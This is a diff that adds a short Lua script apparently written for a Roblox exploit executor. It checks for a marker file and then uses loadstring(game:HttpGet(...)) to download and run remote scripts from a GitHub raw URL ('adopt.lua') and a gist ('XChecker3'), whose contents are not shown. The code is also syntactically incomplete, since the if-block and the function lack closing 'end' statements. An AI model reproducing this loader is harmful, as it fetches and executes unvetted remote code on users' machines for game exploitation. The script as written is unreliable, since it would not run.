@@ -1,0 +1,28 @@
+local autoExecFile = "autoexecdata.txt" -- File to store the auto-execution state
+
+-- Function to save execution state
+local function saveAutoExecState()
+    writefile(autoExecFile, "Executed") -- Create a file that saves the "executed" state
+end
+
+-- Function to check execution state
+local function checkAutoExecState()
+    if isfile(autoExecFile) then
+        return true -- Return true if the file exists (meaning it was executed before)
+    else
+        return false
+    end
+end
+
+-- Auto-execute function
+local function autoExecute()
+    if checkAutoExecState() then
+        -- Script already executed before, auto-executing again
+        getgenv().gui = false
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/doslobodydoedy/x/main/adopt.lua", true))()
+
+        _G.scriptName = "XChecker3"
+        loadstring(game:HttpGet("https://gist.githubusercontent.com/XScriptsOfficial/1c469f4f7b52f96b487a5ea773cabafa/raw/echeck-903a2bbdd96525078d29a2857c5afffbd79ef6a/XChecker3"))()
+
+-- Run the auto-execute function when the script starts
+autoExecute()
